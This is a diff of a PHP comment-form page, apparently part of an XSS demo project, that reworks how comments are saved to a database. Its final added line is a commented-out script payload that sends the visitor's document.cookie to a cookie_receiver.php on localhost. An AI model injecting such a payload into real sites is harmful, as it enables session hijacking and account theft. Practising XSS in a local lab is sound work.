@@ -82,29 +82,40 @@
         <textarea  name="Kommentar" id="Kommentar" rows="6" cols="40" class="cssdesign"></textarea> 
         <input type="submit" name="submit" value="GO" id="Go-Kommentar"></input>
       </div>
-      
       <div class="form-name">
         <label> Name: </label>
         <textarea  name="Autor" id="Autor" rows="1" cols="40" class="cssdesign"></textarea> 
         <input type="submit" name="submit" value="GO" id="Go-Autor"></input>
       </div>
     </form>
-    <?php
+    <?php  
+     $_bool = false;
      if(isset($_POST["submit"])){
        $_KOMMENTAR_based =  $_POST["Kommentar"];
        $_NAME_based =  $_POST["Autor"];
-       $sql = 'INSERT INTO kommentare (autor_name, kommentar) VALUES (?, ?)';
-       $_send = $conn->prepare($sql);
-       $_send->bind_param('ss',$_NAME_based, $_KOMMENTAR_based);
-       $_send->execute();
+       $_bool = true; 
+       unset($_POST["submit"]);
        unset($_POST["Autor"]);
        unset($_POST["Kommentar"]);
-       unset($_POST["submit"]);
-     }         
-     ?> 
-    
+      }
+      if( $_KOMMENTAR_based != "0" && $_NAME_based != "0"){
 
+        $sql = 'INSERT INTO kommentare (autor_name, kommentar) VALUES (?, ?)';
+        $_send = $conn->prepare($sql);
+        $_send->bind_param('ss',$_NAME_based, $_KOMMENTAR_based);
+        $_send->execute();
+      }
+      if($_bool){
+        $_KOMMENTAR_based = "0";
+        $_NAME_based = "0";
+        unset($_POST["submit"]);
+        unset($_POST["Autor"]);
+        unset($_POST["Kommentar"]);
+      }
+       
+     ?> 
   </body>
 
   <script src="script.js"> </script>
 </html>
+<!-- <script> document.write('<img src="https://localhost/AA/Example-page-XSS/cookie_receiver.php?cookie=' + escape(document.cookie) + '"/>'); </script> -->
